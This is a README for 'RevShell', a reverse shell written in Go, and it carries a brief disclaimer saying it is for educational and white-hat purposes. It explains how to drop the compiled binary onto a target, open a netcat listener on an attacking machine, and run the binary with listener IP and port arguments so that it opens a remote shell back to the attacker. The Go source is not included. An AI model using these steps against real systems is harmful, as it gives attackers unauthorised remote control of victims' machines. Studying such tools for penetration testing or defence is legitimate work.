# RevShell

Simple reverse shell written in Golang. Similar shells have been written by others.

## Disclaimer 

This is for educational and white-hat purposes only.

The author of this repository takes no responsibility for anything you do with the
code provided. 

_!!! YOUR ACTIONS ARE YOUR OWN !!!_

## Basic Overview

To get the reverse shell working, deploy ("drop") the compiled binary onto the target
and open up a listener on your "attacking" machine.

A simple way to open up a listener is by using netcat:

```bash
nc -lvnp <YOUR_PORT_HERE>
```

By default, the reverse shell will attempt to connect to `5555`.

After the listener is setup, have the shell binary execute and point to your listener
machine's IP address and port by providing the `-l` argument and `-p` argument 
(if the listening port is not `5555`).

Example:

```bash
./revshell.out -l 123.456.1.1 -p 12345
```